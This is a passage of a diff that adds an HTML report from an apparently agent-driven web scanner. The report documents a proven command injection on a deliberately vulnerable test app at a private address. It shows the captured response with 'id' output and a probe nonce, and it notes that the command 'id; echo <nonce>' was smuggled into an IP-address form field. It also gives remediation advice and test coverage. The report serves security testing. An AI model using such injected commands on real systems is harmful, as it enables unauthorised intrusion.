+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: Command Injection&lt;/h1&gt;
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;h2&gt;Ping a device&lt;/h2&gt;
+
+		&lt;form name=&quot;ping&quot; action=&quot;#&quot; method=&quot;post&quot;&gt;
+			&lt;p&gt;
+				Enter an IP address:
+				&lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.052 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.057 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.316 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.090 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.052/0.129/0.316/0.109 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+arguspaobml3w
+&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&quot; target=&quot;_blank&quot;&gt;http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/bash/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/bash/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.ss64.com/nt/&quot; target=&quot;_blank&quot;&gt;http://www.ss64.com/nt/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Command_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/Command_Injection&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id</pre></details><p><b>Remediation</b><br>Never pass request values to a shell; use argv and an allowlist.</p><details><summary><b>Proof grade: proven</b></summary><p class='meta'>Requirement for rce: the output of `id; echo &lt;nonce&gt;` returned by the target, with the nonce tying the output to the probe</p><ul><li>&#10003; proof read from the wire</li><li>&#10003; the target produced the quoted bytes &mdash; <i>from r18</i></li><li>&#10003; a benign command was sent &mdash; <i>exchange r18</i></li><li>&#10003; identity output returned by the target &mdash; <i>&#x27;uid=33(www-data)&#x27; in r18</i></li><li>&#10003; the quoted bytes are the command output &mdash; <i>&#x27;uid=33(www-data)&#x27; carries the identity line</i></li><li>&#10003; the probe nonce came back in the output &mdash; <i>&#x27;arguspaobml3w&#x27; in r18</i></li><li>&#10003; proof command stayed benign</li></ul></details></div>
+<h2>Test coverage</h2>
+<p><b>Probes exercised:</b> <code>probe_cmdi</code>, <code>probe_sqli</code></p>
+<table><tr><th>Endpoint touched</th></tr><tr><td><code>GET /vulnerabilities/sqli/?Submit&amp;id</code></td></tr><tr><td><code>POST /vulnerabilities/exec/</code></td></tr></table>
+<table><tr><th>Tool</th><th>Requests</th></tr><tr><td>probe_cmdi</td><td>3</td></tr><tr><td>probe_sqli</td><td>15</td></tr></table>
+<details><summary>Appendix: agent working notes (audit)</summary><pre># Working notes - http://192.168.223.221:8081
+
+</pre></details>
+<p class="meta">Generated by Argus v1.0.0 - every finding
+cites verbatim response bytes verified against the recorded transcript.</p>
+</body></html>
